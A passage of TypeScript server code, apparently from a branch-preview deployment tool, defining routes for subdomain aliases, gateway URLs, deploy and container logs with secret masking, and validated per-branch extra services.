  // 63 chars (unresolvable + not covered by the wildcard cert). See forwarder-route-publisher.ts:159-315.
  //
  // SSOT for BOTH the GET and PUT /subdomain-aliases responses — gatewayUrls are branch-derived (not
  // alias-derived), so PUT must return them too or the panel drops the 网关入口 block after saving
  // aliases until a full reload (Bugbot "Alias save clears gateway URLs").
  const computeBranchGatewayUrls = (
    entry: BranchEntry,
    primaryRoot: string,
  ): Array<{ subdomain: string; name: string; url: string }> => {
    const project = stateService.getProject(entry.projectId);
    const gwPreviewSlug = buildPreviewUrlForProject('', entry.branch, project, entry.projectId).previewSlug;
    const gatewayUrls: Array<{ subdomain: string; name: string; url: string }> = [];
    if (!gwPreviewSlug) return gatewayUrls;
    const profileById = new Map<string, BuildProfile>();
    for (const bp of stateService.getEffectiveProfilesForBranch(entry)) {
      // resolveEffectiveProfile applies branch profileOverrides (subdomain / readinessProbe / …),
      // exactly like the publisher; without it override-driven landing paths would drift from the
      // route the forwarder actually serves.
      profileById.set(bp.id, resolveEffectiveProfile(bp, entry));
    }
    // Collect routable services, sorted by profileId so first-wins dedup is deterministic across
    // object-key ordering changes (mirrors publisher's subdomainCandidates sort).
    const routable = Object.entries(entry.services ?? {})
      .filter(([, svc]) => svc?.hostPort && ROUTABLE_SERVICE_STATUSES.has(String(svc.status)))
      .map(([profileId]) => profileId)
      .sort((a, b) => a.localeCompare(b));
    const seenSubdomains = new Set<string>();
    for (const profileId of routable) {
      const profile = profileById.get(profileId);
      const sub = profile?.subdomain;
      if (!sub) continue;
      if (seenSubdomains.has(sub)) continue;
      const namedLabel = `${gwPreviewSlug}-${sub}`;
      if (namedLabel.length > 63) continue; // RFC 1035 single-label limit + wildcard cert coverage
      seenSubdomains.add(sub);
      // Landing path — pick the path most likely to return a live 200 when the entry is clicked
      // (Codex P2: don't force every named service onto the LLM gateway health path):
      //   1) Known LLM gateway subdomains mount their API under /gw/* (console) or /gw/v1/* (serving)
      //      and 404 at the bare root, so land on their health endpoint explicitly.
      //   2) Any other named service (docs / metrics / …) — the forwarder publishes the named host to
      //      the container root, so honor the profile's readiness path when set, else land at '/'.
      const landingPath = resolveGatewayLandingPath(sub, profile?.readinessProbe?.path);
      gatewayUrls.push({
        subdomain: sub,
        name: profileId,
        url: `http://${namedLabel}.${primaryRoot}${landingPath}`,
      });
    }
    return gatewayUrls;
  };

  router.get('/branches/:id/subdomain-aliases', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const aliases = stateService.getBranchSubdomainAliases(id);
    // Compute the full preview URLs so the UI can show them without
    // re-reading CDS config separately.
    const rootDomains = config.rootDomains?.length
      ? config.rootDomains
      : (config.previewDomain ? [config.previewDomain] : []);
    const primaryRoot = rootDomains[0] || 'example.com';
    const previewUrls = aliases.map(a => `http://${a}.${primaryRoot}`);
    const defaultUrl = `http://${id}.${primaryRoot}`;

    res.json({
      branchId: id,
      aliases,
      defaultUrl,
      previewUrls,
      gatewayUrls: computeBranchGatewayUrls(entry, primaryRoot),
      rootDomain: primaryRoot,
    });
  });

  router.put('/branches/:id/subdomain-aliases', (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const body = (req.body ?? {}) as { aliases?: unknown };
    if (!Array.isArray(body.aliases)) {
      res.status(400).json({ error: '请求体需要 { aliases: string[] } 格式' });
      return;
    }

    // Normalize: trim + lowercase, drop empties. Preserve order for UI display.
    const normalized: string[] = [];
    const seen = new Set<string>();
    for (const raw of body.aliases) {
      if (typeof raw !== 'string') continue;
      const lower = raw.trim().toLowerCase();
      if (!lower) continue;
      if (seen.has(lower)) continue; // drop duplicates within the request
      seen.add(lower);
      normalized.push(lower);
    }

    // Validate each label against DNS rules
    const invalidLabels = normalized.filter(a => !DNS_LABEL_RE.test(a) || a.length > 63);
    if (invalidLabels.length > 0) {
      res.status(400).json({
        error: `无效的子域名标签: ${invalidLabels.join(', ')}。只允许小写字母、数字、连字符，首尾必须是字母或数字，长度 1-63。`,
        invalidLabels,
      });
      return;
    }

    // Reject reserved labels
    const reservedHits = normalized.filter(a => RESERVED_ALIAS_LABELS.has(a));
    if (reservedHits.length > 0) {
      res.status(400).json({
        error: `保留字不允许作为别名: ${reservedHits.join(', ')}`,
        reservedLabels: reservedHits,
      });
      return;
    }

    // Reject aliases that equal this branch's own slug (no-op + confusing)
    const selfCollisions = normalized.filter(a => a === id.toLowerCase());
    if (selfCollisions.length > 0) {
      res.status(400).json({
        error: `别名不能等于分支自身的 slug "${id}"（默认路径已经覆盖）`,
      });
      return;
    }

    // Check collisions with other branches' slugs/aliases
    const collisions = stateService.findAliasCollisions(id, normalized);
    if (collisions.length > 0) {
      res.status(409).json({
        error: `子域名冲突: ${collisions.map(c => `"${c.alias}" 已被分支 "${c.conflictWith}" ${c.reason === 'slug' ? '的默认 slug' : '的别名'}占用`).join('; ')}`,
        collisions,
      });
      return;
    }

    try {
      stateService.setBranchSubdomainAliases(id, normalized);
      stateService.save();
      // Return the new aliases + preview URLs so the UI can update instantly
      const rootDomains = config.rootDomains?.length
        ? config.rootDomains
        : (config.previewDomain ? [config.previewDomain] : []);
      const primaryRoot = rootDomains[0] || 'example.com';
      res.json({
        message: '已保存子域名别名',
        branchId: id,
        aliases: normalized,
        previewUrls: normalized.map(a => `http://${a}.${primaryRoot}`),
        defaultUrl: `http://${id}.${primaryRoot}`,
        // gatewayUrls are branch-derived (not alias-derived); return them so the panel keeps the
        // 网关入口 block + 预览下拉 after saving aliases, instead of dropping them until a full
        // reload (Bugbot "Alias save clears gateway URLs"). Same SSOT helper as the GET response.
        gatewayUrls: computeBranchGatewayUrls(entry, primaryRoot),
        rootDomain: primaryRoot,
        needsRedeploy: false, // aliases are proxy-level, no container restart needed
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/branches/:id/profile-overrides/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      stateService.clearBranchProfileOverride(id, profileId);
      stateService.save();
      res.json({ message: '已恢复为公共配置', profileId, needsRedeploy: true });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Container logs ──

  router.get('/branches/:id/logs', (req, res) => {
    const { id } = req.params;
    const logs = stateService.getLogs(id);

    // F10 fix (2026-05-02 onboarding UAT): the OperationLog stored here is
    // only flushed when a deploy finishes (success or error), so an
    // in-progress build returns `{ logs: [] }` and the user sees an empty
    // panel for 30-90 seconds with no clue what's happening. Until the
    // deploy executor learns to checkpoint mid-flight (Phase B), we expose
    // a `liveStreamHint` pointing at the existing branch-events SSE stream
    // so a smarter client (UI / cdscli / Agent) can subscribe to live
    // step+log events instead of polling this endpoint.
    //
    // Schema: stable contract — `logs` is the historical (post-finalize)
    // record, `liveStreamHint` is the SSE channel for real-time progress.
    // The branches stream is filtered server-side by `?project=<id>`; pass
    // through the projectId so consumers don't need to look it up first.
    const branch = stateService.getBranch(id);
    const projectId = branch?.projectId || 'default';

    // #551 (d) — 即使没 opLog 也提供 fallback：当 logs 为空但 branch.status=error
    // 时合成一条最简记录，把 errorMessage 浮起来给 Agent / UI 看。否则用户只看到
    // 状态 'error' 没有原因，无法判断发生了什么。这条 fallback 记录带 synthetic=true
    // 标记，前端可以选择性区分对待。
    const runningServices = Object.values(branch?.services || {}).filter((svc) => svc.status === 'running');
    const hasRecoveredRuntime = logs.length === 0 && !!branch && branch.status === 'running' && runningServices.length > 0;
    const isErrorFallback = logs.length === 0 && branch?.status === 'error' && !!branch.errorMessage;
    const fallbackLogs = isErrorFallback
      ? [{
          id: `synthetic-${id}`,
          synthetic: true,
          status: 'error' as const,
          startedAt: branch?.lastAccessedAt || branch?.createdAt || new Date().toISOString(),
          finishedAt: branch?.lastAccessedAt || new Date().toISOString(),
          events: [{
            step: 'deploy',
            status: 'error' as const,
            title: branch?.errorMessage || '部署失败（无详细日志）',
            log:
              '上一次部署没有留下完整 OperationLog（CDS 进程中断、SSE 写入失败或 deploy 在 appendLog 之前抛错）。\n' +
              `branch.errorMessage = "${branch?.errorMessage || ''}"\n` +
              '请直接重新部署：POST /api/branches/' + id + '/deploy',
            timestamp: branch?.lastAccessedAt || new Date().toISOString(),
          }],
        }]
      : hasRecoveredRuntime
        ? [{
            type: 'build',
            status: 'completed',
            startedAt: branch.lastAccessedAt || branch.lastReadyAt || branch.createdAt || new Date().toISOString(),
            finishedAt: branch.lastReadyAt || branch.lastAccessedAt || new Date().toISOString(),
            runtimeStartedAt: branch.lastReadyAt || branch.lastAccessedAt || undefined,
            events: [
              {
                step: 'runtime-recovered',
                status: 'done',
                title: '运行态已恢复，但原始构建记录缺失',
                log:
                  'CDS 当前能确认该分支容器正在运行，但没有找到本次部署的 OperationLog。' +
                  '常见原因是部署请求/进程在最终 appendLog 前中断，或历史版本只写入 service state 而没有写入部署历史。' +
                  '请查看容器日志作为运行证据；下一次重新部署后会生成完整构建记录。',
                detail: {
                  recoveredFrom: 'branch.services',
                  runningServices: runningServices.map((svc) => ({
                    profileId: svc.profileId,
                    containerName: svc.containerName,
                    hostPort: svc.hostPort,
                  })),
                },
                timestamp: branch.lastReadyAt || branch.lastAccessedAt || new Date().toISOString(),
              },
            ],
          }]
      : [];

    res.json({
      logs: logs.length > 0 ? logs : fallbackLogs,
      logsAreSynthetic: (isErrorFallback || hasRecoveredRuntime) || undefined,
      branchStatus: branch?.status,
      branchErrorMessage: branch?.errorMessage,
      liveStreamHint: {
        // Subscribe to this URL to receive live deploy events for this
        // branch. Filter by `payload.branchId === <id>` after reception
        // — the channel multiplexes all branches in the project.
        url: `/api/branches/stream?project=${encodeURIComponent(projectId)}`,
        eventTypes: [
          'snapshot',     // initial state on connect
          'branch.status', // building / running / error transitions
          'branch.created', // (filtered by projectId)
        ],
        note: '在部署进行中时,本端点的 logs 数组可能仍为空。要看实时进度请订阅 liveStreamHint.url。',
      },
    });
  });

  router.post('/branches/:id/container-logs', async (req, res) => {
    const { id } = req.params;
    const { profileId } = req.body as { profileId?: string };
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到服务' });
      return;
    }

    try {
      const running = await containerService.isRunning(svc.containerName);
      if (!running) {
        // Container may exist but stopped, or not exist at all – try docker inspect
        const inspectResult = await shell.exec(
          `docker inspect --format="{{.State.Status}}" ${svc.containerName}`,
        );
        if (inspectResult.exitCode !== 0) {
          const message = `容器 ${svc.containerName} 不存在，可能已被清理。请重新部署。`;
          stateService.appendContainerLogArchive(id, {
            projectId: entry.projectId,
            profileId: svc.profileId,
            containerName: svc.containerName,
            hostPort: svc.hostPort,
            status: svc.status,
            source: 'container-logs-api',
            masked: true,
            logs: message,
            message: 'container logs requested after container disappeared',
          });
          serverEventLogStore?.record({
            category: 'container',
            severity: 'warn',
            source: 'container-logs-api',
            action: 'container.logs.missing',
            message,
            projectId: entry.projectId,
            branchId: id,
            profileId: svc.profileId,
            containerName: svc.containerName,
            status: svc.status,
            error: { message: inspectResult.stderr || inspectResult.stdout || 'docker inspect failed' },
            details: { hostPort: svc.hostPort, inspectExitCode: inspectResult.exitCode },
          });
          stateService.save();
          res.json({ logs: message });
          return;
        }
      }
      const logs = await containerService.getLogs(svc.containerName);
      // F15: mask GITHUB_PAT / DB passwords / Authorization headers etc. that
      // appear in build logs (e.g. when a Dockerfile RUN step echoes env, or
      // when the app prints connection strings on boot). Default mask is on;
      // admin can override with ?unmask=1.
      const mask = shouldMask(req);
      const masked = maskSecretsText(logs, { mask });
      stateService.appendContainerLogArchive(id, {
        projectId: entry.projectId,
        profileId: svc.profileId,
        containerName: svc.containerName,
        hostPort: svc.hostPort,
        status: svc.status,
        source: 'container-logs-api',
        masked: mask,
        logs: masked,
      });
      serverEventLogStore?.record({
        category: 'container',
        severity: 'info',
        source: 'container-logs-api',
        action: 'container.logs.read',
        message: `container logs read via API for ${svc.containerName}`,
        projectId: entry.projectId,
        branchId: id,
        profileId: svc.profileId,
        containerName: svc.containerName,
        status: svc.status,
        logs: normalizeLogText(masked, 500),
        details: { masked: mask, hostPort: svc.hostPort },
      });
      stateService.save();
      res.json({ logs: masked });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.get('/branches/:id/container-log-archives', (req, res) => {
    const { id } = req.params;
    const includeLogs = req.query.includeLogs === '1';
    const archives = stateService.getContainerLogArchives(id);
    res.json({
      branchId: id,
      count: archives.length,
      archives: archives.slice().reverse().map((entry) => includeLogs ? entry : {
        id: entry.id,
        branchId: entry.branchId,
        projectId: entry.projectId,
        profileId: entry.profileId,
        containerName: entry.containerName,
        hostPort: entry.hostPort,
        status: entry.status,
        capturedAt: entry.capturedAt,
        source: entry.source,
        sha256: entry.sha256,
        byteLength: entry.byteLength,
        lineCount: entry.lineCount,
        masked: entry.masked,
        message: entry.message,
      }),
    });
  });

  // ── Container log stream (SSE) — replaces polling ──

  router.get('/branches/:id/container-logs-stream/:profileId', (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) { res.status(404).json({ error: `分支 "${id}" 不存在` }); return; }

    const svc = entry.services[profileId];
    if (!svc) { res.status(404).json({ error: '未找到服务' }); return; }

    initSSE(res);

    const chunks: string[] = [];
    const ac = containerService.streamLogs(
      svc.containerName,
      (chunk) => {
        chunks.push(chunk);
        sendSSE(res, 'log', { chunk });
      },
      () => {
        if (chunks.length > 0) {
          const logs = maskSecretsText(chunks.join(''), { mask: shouldMask(req) });
          stateService.appendContainerLogArchive(id, {
            projectId: entry.projectId,
            profileId: svc.profileId,
            containerName: svc.containerName,
            hostPort: svc.hostPort,
            status: svc.status,
            source: 'container-logs-stream',
            masked: shouldMask(req),
            logs,
          });
          serverEventLogStore?.record({
            category: 'container',
            severity: 'info',
            source: 'container-logs-stream',
            action: 'container.logs.stream-closed',
            message: `container log stream closed for ${svc.containerName}`,
            projectId: entry.projectId,
            branchId: id,
            profileId: svc.profileId,
            containerName: svc.containerName,
            status: svc.status,
            logs: normalizeLogText(logs, 200),
            details: { masked: shouldMask(req), hostPort: svc.hostPort },
          });
          stateService.save();
        }
        try { res.end(); } catch { /* already closed */ }
      },
    );

    // Client disconnect → stop docker logs -f
    req.on('close', () => ac.abort());
  });

  // ── Container env ──

  router.post('/branches/:id/container-env', async (req, res) => {
    const { id } = req.params;
    const { profileId } = req.body as { profileId?: string };
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    const svc = profileId ? entry.services[profileId] : Object.values(entry.services)[0];
    if (!svc) {
      res.status(404).json({ error: '未找到服务' });
      return;
    }

    try {
      const env = await containerService.getEnv(svc.containerName);
      res.json({ env });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── 分支级临时额外服务(branch-local extra services) ──
  // 项目 profiles 是稳定底座(改它走审批);单条分支可在底座之上临时追加自己的服务,只在本分支
  // 部署、跑在分支专属网、不进项目、不需全局审批、删分支即消失。详见 design.cds.branch-local-extra-services。

  router.get('/branches/:id/extra-services', (req, res) => {
    const entry = stateService.getBranch(req.params.id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    // 项目级访问控制(Bugbot High / learned rule: 所有项目级资源 handler 必须 assertProjectAccess):
    // 防止项目 A 的 cdsp_ key 读取/改动项目 B 分支的额外服务。
    const mGet = assertProjectAccess(req as any, entry.projectId || 'default');
    if (mGet) {
      res.status(mGet.status).json(mGet.body);
      return;
    }
    res.json({ extraProfiles: maskExtraProfilesEnv(entry.extraProfiles || []) || [] });
  });

  router.put('/branches/:id/extra-services', async (req, res) => {
    const entry = stateService.getBranch(req.params.id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    // 项目级访问控制(同上):PUT 会改部署清单 + ?redeploy=1 触发重部署,跨项目越权风险更高,必须校验。
    const mPut = assertProjectAccess(req as any, entry.projectId || 'default');
    if (mPut) {
      res.status(mPut.status).json(mPut.body);
      return;
    }
    const body = (req.body || {}) as { extraProfiles?: unknown };
    const list = body.extraProfiles;
    if (!Array.isArray(list)) {
      res.status(400).json({ error: 'extraProfiles 必须是数组(空数组=清空额外服务)' });
      return;
    }
    // 项目 profile id 集合:额外服务撞这些 id 会被合并规则丢弃,所以直接拒绝,明确告知调用方。
    const projectIds = new Set(
      stateService.getBuildProfilesForProject(entry.projectId || 'default').map((p) => p.id),
    );
    // env 合并 + 掩码哨兵剥离（Bugbot High「PUT drops omitted env」+ Medium「persists mask sentinels」
    // / learned rule）。两条铁律：
    //  1. **merge 不 replace**：以同 id 旧 profile 的 env 为基底，再叠加入参——入参省略 env 不丢旧密钥、
    //     入参部分 env 不删未提及的旧 key（与 build-profiles PUT 的 Bug AA merge 口径一致）。
    //  2. **剥离掩码哨兵**：入参值命中 `***` / `***[masked]***` 等 → 保留旧值（基底里已有）；旧值不存在
    //     则不写入（绝不持久化字面哨兵）。
    const MASK_SENTINELS = new Set(['***', '***[masked]***', '****', '*****']);
    const prevExtraEnvById = new Map<string, Record<string, string>>(
      (entry.extraProfiles || []).map((p) => [p.id, (p.env || {}) as Record<string, string>]),
    );
    // 命名子域同 env：入参省略 subdomain 字段时**继承旧值**，否则纯 env 改动的 redeploy 会静默抹掉命名 URL、
    // 断掉 forwarder host 路由（Cursor Bugbot）。显式传空串 ''=有意清空。
    const prevExtraSubdomainById = new Map<string, string>(
      (entry.extraProfiles || []).flatMap((p) => (p.subdomain ? [[p.id, p.subdomain] as [string, string]] : [])),
    );
    const mergeExtraEnv = (incoming: Record<string, unknown>, prevEnv: Record<string, string>): Record<string, string> => {
      const out: Record<string, string> = { ...prevEnv }; // 基底 = 旧 env（merge，省略即保留）
      for (const [k, v] of Object.entries(incoming || {})) {
        if (typeof v !== 'string') continue;
        if (MASK_SENTINELS.has(v.trim())) {
          // 哨兵：保留旧值（已在基底）；旧值不存在则确保不写入字面哨兵
          if (!Object.prototype.hasOwnProperty.call(prevEnv, k)) delete out[k];
          continue;
        }
        out[k] = v; // 真实值覆盖
      }
      return out;
    };
    const sanitized: BuildProfile[] = [];
    const seen = new Set<string>();
    // 命名子域必须分支内唯一：两个服务复用同一 subdomain 会让 forwarder 发出多条同 host
    // 不同上游端口的路由 → host 路由不确定命中错容器（Cursor Bugbot）。
    const seenSubdomains = new Set<string>();
    for (const raw of list as Array<Record<string, unknown>>) {
      const id = String(raw?.id || '').trim();
      if (!isValidExtraProfileId(id)) {
        res.status(400).json({ error: `额外服务 id 非法: ${JSON.stringify(raw?.id)}(只能字母/数字开头,含 - _,长度 1..63)` });
        return;
      }
      if (projectIds.has(id)) {
        res.status(400).json({ error: `额外服务 id "${id}" 与项目服务撞名,分支额外服务不能覆盖项目底座(要按分支改项目服务请用 profileOverrides)` });
        return;
      }
      if (seen.has(id)) {
        res.status(400).json({ error: `额外服务 id "${id}" 重复` });
        return;
      }
      const dockerImage = String(raw?.dockerImage || '').trim();
      const containerPort = Number(raw?.containerPort);
      if (!dockerImage) {
        res.status(400).json({ error: `额外服务 "${id}" 缺少 dockerImage` });
        return;
      }
      // 严格镜像引用校验（Codex P1，宿主机命令注入边界防御）：dockerImage 会进 docker create/run 的
      // 宿主机命令行，含 shell 元字符（;$\`&|()<>空格等）会在 CDS 宿主机执行。镜像引用本就只含
      // 字母/数字/._:/@-，这里在入口直接拒非法字符（container.ts 另对镜像与 command 做 shellQuote 兜底）。
      if (!/^[a-zA-Z0-9][a-zA-Z0-9._:/@-]*$/.test(dockerImage)) {
        res.status(400).json({ error: `额外服务 "${id}" 的 dockerImage 含非法字符（镜像引用仅允许字母/数字/._:/@- ）` });
        return;
      }
      if (!Number.isInteger(containerPort) || containerPort <= 0 || containerPort > 65535) {
        res.status(400).json({ error: `额外服务 "${id}" 的 containerPort 非法` });
        return;
      }
      // workDir 边界校验（Codex P1「Validate extra-service workDir before deploy」）：workDir 会被
      // path.join(worktreePath, workDir) 拼成宿主机挂载源、再进 docker create/run 命令行。container.ts
      // 已对挂载路径 shellQuote 兜底，这里在入口再加严格白名单——只允许相对路径段（字母/数字/._-/ 与分隔符），
      // 禁 shell 元字符与 .. 穿越，杜绝 workDir 含双引号 + $()/反引号 越权执行或挂载越界。
      const workDir = String(raw?.workDir || '').trim();
      if (workDir) {
        if (!/^[a-zA-Z0-9._/-]+$/.test(workDir) || workDir.split('/').includes('..')) {
          res.status(400).json({ error: `额外服务 "${id}" 的 workDir 非法（仅允许相对路径，字母/数字/._-/，禁 .. 穿越与 shell 元字符）` });
          return;
        }
      }
      // containerWorkDir 边界校验（Codex P2「Preserve container workdir for extra services」）：白名单此前丢弃它，
      // 导致需要非默认容器工作目录的镜像/monorepo 服务被强制部署在 /app 而运行期失败。这里予以保留 + 校验：
      // 容器内绝对路径（以 / 开头），与 workDir 同字符集（字母/数字/._-/），禁 .. 穿越与 shell 元字符（container.ts
      // 对 -w / 挂载目标 shellQuote 兜底）。空 = 省略，container.ts 退回默认 /app。
      const containerWorkDir = String(raw?.containerWorkDir || '').trim();
      if (containerWorkDir) {
        if (!/^\/[a-zA-Z0-9._/-]*$/.test(containerWorkDir) || containerWorkDir.split('/').includes('..')) {
          res.status(400).json({ error: `额外服务 "${id}" 的 containerWorkDir 非法（须为容器内绝对路径，字母/数字/._-/，禁 .. 穿越与 shell 元字符）` });
          return;
        }
      }
      // dbScope 边界校验（Codex P2「Preserve dbScope on extra services」）：白名单此前丢弃 dbScope,
      // resolveProfileRuntimeEnv 见 undefined 就跳过 per-branch 数据库改写,声明 dbScope:'per-branch' 的额外
      // 服务(跑迁移/测试)会落回共享库、破坏分支隔离。这里予以保留 + 校验枚举(shared/per-branch),非法值显式拒绝。
      let dbScope: 'shared' | 'per-branch' | undefined;
      if (raw?.dbScope !== undefined) {
        if (raw.dbScope !== 'shared' && raw.dbScope !== 'per-branch') {
          res.status(400).json({ error: `额外服务 "${id}" 的 dbScope 非法（仅允许 'shared' 或 'per-branch'）` });
          return;
        }
        dbScope = raw.dbScope;
      }
      // 保留分支级路由/依赖/就绪元数据（Codex P2「Preserve branch-local routing metadata」）：
      // 早期白名单只留 id/image/workDir/command/port/env，把 pathPrefixes（路由前缀）、dependsOn
      // （启动顺序）、readinessProbe / startupSignal（就绪判定）这些 deploy 真正消费的字段静默丢了，
      // 导致拆服务实验里靠路由前缀/启动顺序的额外服务不可达或起错序。这里按受支持字段透传 + 校验。
      const strArray = (v: unknown): string[] | undefined => {
        if (!Array.isArray(v)) return undefined;
        const arr = v.map((x) => String(x).trim()).filter((x) => x.length > 0);
        return arr.length > 0 ? arr : undefined;
      };
      const pathPrefixes = strArray(raw?.pathPrefixes);
      const dependsOn = strArray(raw?.dependsOn);
      const startupSignal = typeof raw?.startupSignal === 'string' && raw.startupSignal.trim() !== ''
        ? raw.startupSignal : undefined;
      const readinessProbe = ((): ReadinessProbe | undefined => {
        const rp = raw?.readinessProbe;
        if (!rp || typeof rp !== 'object' || Array.isArray(rp)) return undefined;
        const o = rp as Record<string, unknown>;
        const out: ReadinessProbe = {};
        if (typeof o.path === 'string' && o.path.trim() !== '') out.path = o.path.trim();
        if (typeof o.intervalSeconds === 'number' && o.intervalSeconds > 0) out.intervalSeconds = o.intervalSeconds;
        if (typeof o.timeoutSeconds === 'number' && o.timeoutSeconds > 0) out.timeoutSeconds = o.timeoutSeconds;
        if (o.noHttp === true) out.noHttp = true;
        return Object.keys(out).length > 0 ? out : undefined;
      })();
      // entrypoint 覆盖（Codex P2「Preserve extra-service entrypoint overrides」）：白名单此前止于
      // prebuiltImage,丢弃了 BuildProfile.entrypoint,带 wrapper entrypoint 的镜像（典型 DB/CRM 镜像
      // 自跑初始化脚本)无法清空/覆盖入口 → 运行期抢跑失败。这里予以保留 + 校验:空串 ""=清空 image
      // ENTRYPOINT(container.ts 走 --entrypoint=""),否则必须是单 token 可执行名/路径(Docker --entrypoint
      // 只接单 token;container.ts 另对含空格者告警跳过、并对值 JSON.stringify 兜底 shell 安全)。
      let entrypoint: string | undefined;
      if (raw?.entrypoint !== undefined) {
        if (typeof raw.entrypoint !== 'string') {
          res.status(400).json({ error: `额外服务 "${id}" 的 entrypoint 必须是字符串(""=清空 image ENTRYPOINT)` });
          return;
        }
        const ep = raw.entrypoint.trim();
        if (ep !== '' && (/\s/.test(ep) || !/^\/?[a-zA-Z0-9._/-]+$/.test(ep))) {
          res.status(400).json({ error: `额外服务 "${id}" 的 entrypoint 非法(须为单个可执行名/路径,无空格与 shell 元字符;""=清空 image ENTRYPOINT)` });
          return;
        }
        entrypoint = ep;
      }
      // 命名子域(Codex「Expose named per-service URL」):声明后该额外服务获得
      // `<previewSlug>-<subdomain>.<root>` 独立命名 URL(forwarder 直达容器根路径),
      // 给「可被别人调用」的独立服务(LLM 网关)区别于主应用的入口。须单 DNS label。
      let subdomain: string | undefined;
      // 字段缺省 → 继承旧值（省略即保留，不静默删命名 URL）；显式空串 → 有意清空；非空 → 校验后采用。
      let sdCandidate: string | undefined;
      if (raw?.subdomain === undefined) {
        sdCandidate = prevExtraSubdomainById.get(id);   // 字段缺省 = 继承旧值
      } else if (raw.subdomain !== null && String(raw.subdomain).trim() !== '') {
        sdCandidate = String(raw.subdomain).trim().toLowerCase();  // 非空字符串 = 采用
      }
      // 显式 null / '' / 纯空白 = 有意清空（sdCandidate 保持 undefined）。
      // 必须挡 null：String(null)==="null" 会过校验、落出伪命名 host `<slug>-null`（Cursor Bugbot）。
      if (sdCandidate !== undefined) {
        const sd = sdCandidate.toLowerCase();
        if (!isValidServiceSubdomain(sd)) {
          res.status(400).json({ error: `额外服务 "${id}" 的 subdomain 非法（须为单个 DNS label：小写字母/数字/连字符，不以连字符开头/结尾，长度 1..40）` });
          return;
        }
        if (seenSubdomains.has(sd)) {
          res.status(400).json({ error: `subdomain "${sd}" 被多个额外服务复用（命名子域须分支内唯一，否则 host 路由会撞车）` });
          return;
        }
        seenSubdomains.add(sd);
        subdomain = sd;
      }
      seen.add(id);
      sanitized.push({
        id,
        name: String(raw?.name || id),
        dockerImage,
        workDir,
        ...(containerWorkDir ? { containerWorkDir } : {}),
        ...(entrypoint !== undefined ? { entrypoint } : {}),
        ...(dbScope !== undefined ? { dbScope } : {}),
        ...(subdomain ? { subdomain } : {}),
        command: String(raw?.command || ''),
        containerPort,
        projectId: entry.projectId || 'default',
        // 总是基于旧 env 合并（即使入参省略 env 也保留旧密钥，不丢失）；合并结果非空才落 env 字段。
        ...((() => {
          const merged = mergeExtraEnv(
            (raw?.env && typeof raw.env === 'object' ? raw.env : {}) as Record<string, unknown>,
            prevExtraEnvById.get(id) || {},
          );
          return Object.keys(merged).length > 0 ? { env: merged } : {};
        })()),
        ...(pathPrefixes ? { pathPrefixes } : {}),
        ...(dependsOn ? { dependsOn } : {}),
        ...(readinessProbe ? { readinessProbe } : {}),
        ...(startupSignal ? { startupSignal } : {}),
        ...(raw?.prebuiltImage === true ? { prebuiltImage: true } : {}),
      } as BuildProfile);
    }
    // 破坏性移除回滚预备（Codex P2「Defer destructive extra-service saves until redeploy is accepted」）：
    // 落库前先快照旧额外服务,并算出「被本次 PUT 删掉、但仍挂着 entry.services 运行行」的 id。
    // 这类移除是破坏性的——若紧接着的自调 deploy 被拒(典型 owning_executor_offline:owning executor 离线、
    // 无法真正下掉远端 worker 容器),master 端却已经丢了 profile 元数据,与仍在跑的 worker 容器永久脱节
    // (幽灵服务)。仅新增/暂停/纯改 env 这类「没删掉任何在跑服务」的变更不算破坏性,deploy 被拒也保留配置。
    const prevExtraProfilesSnapshot: BuildProfile[] = JSON.parse(
      JSON.stringify(entry.extraProfiles || []),
    );
    const sanitizedIds = new Set(sanitized.map((p) => p.id));
    const destructivelyDroppedIds = prevExtraProfilesSnapshot
      .map((p) => p.id)
      .filter((id) => !sanitizedIds.has(id) && entry.services[id] != null);
    const hasDestructiveRemoval = destructivelyDroppedIds.length > 0;
    stateService.setBranchExtraProfiles(entry.id, sanitized);
    let updated = stateService.getBranch(entry.id)!;
    // 一步到位:声明/改额外服务是纯配置变更,不会自动重建已在运行的分支(用户实测痛点)。
    // 带 ?redeploy=1 时,持久化后触发一次真正的分支重部署(走和 webhook 自调相同的 localhost 自 POST
    // /deploy),让新增/改动的额外服务真正起容器、被移除的真正下掉。
    const wantRedeploy = req.query?.redeploy === '1' || req.query?.redeploy === 'true' || (req.body as { redeploy?: unknown })?.redeploy === true;
    let redeployTriggered = false;
    let redeployRejected: { status: number; message: string } | null = null;
    let removalRolledBack = false;
    if (wantRedeploy) {
      // 必须等到自调 deploy 真正被「接受」(HTTP 头到达)再决定 redeployTriggered,否则会出现「明明被拒
      // 还回报已触发」(Bugbot Medium):deploy 端点对 暂停(423)/缺必填环境(412)/in-flight 冲突(409)
      // 都在 initSSE 之前早返回错误码,await 头很快;成功路径 initSSE 之后才流式构建,所以 await 不会卡到
      // 整次构建结束。被接受后在后台把 SSE 流读完丢弃(不阻塞本响应),构建在服务端异步继续
      // (server-authority:客户端断开不取消部署)。
      const url = `http://127.0.0.1:${config.masterPort}/api/branches/${encodeURIComponent(entry.id)}/deploy`;
      try {
        const upstream = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-CDS-Internal': '1',
            'X-CDS-Trigger': 'system',
